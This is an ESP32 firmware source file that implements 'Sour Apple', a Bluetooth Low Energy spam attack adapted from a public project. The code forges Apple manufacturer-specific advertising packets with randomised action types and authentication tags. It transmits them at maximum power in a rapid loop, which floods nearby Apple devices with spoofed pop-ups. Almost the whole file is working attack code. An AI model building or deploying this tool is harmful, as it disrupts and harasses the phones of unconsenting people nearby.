#include "defines.h"

#if APPLE_JOKE
#include "appleJoke.h"
#include "appleSour.h"

BLEAdvertising *NimPAdvertising;
BLEServer *NimPServer;

// https://github.com/RapierXbox/ESP32-Sour-Apple

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;   
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData((char *)packet, sizeof(packet));
  return randomAdvertisementData;
}

void initAppleSour() {
    appleJokeRunning = true;
    debugLog("Executing initAppleSour");
    // Show text
    dis->fillScreen(SCWhite);
    simpleCenterText("Smashing apples");
    disUp(true);

    BLEDevice::init("");

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

    NimPServer = BLEDevice::createServer();

    NimPAdvertising = NimPServer->getAdvertising();
}

void loopAppleSour() {
  resetSleepDelay();
  debugLog("Executing loopAppleSour");
  delay(40);
  BLEAdvertisementData advertisementData = getOAdvertisementData();
  NimPAdvertising->setAdvertisementData(advertisementData);
  NimPAdvertising->start();
  delay(20);
  NimPAdvertising->stop();

  useButton();
}

void exitAppleSour() {
    debugLog("Executing exitAppleSour");
    // Idk
    delete NimPAdvertising;
    delete NimPServer;

    BLEDevice::deinit(true);
    appleJokeRunning = false;

    switchBack();
}

#endif
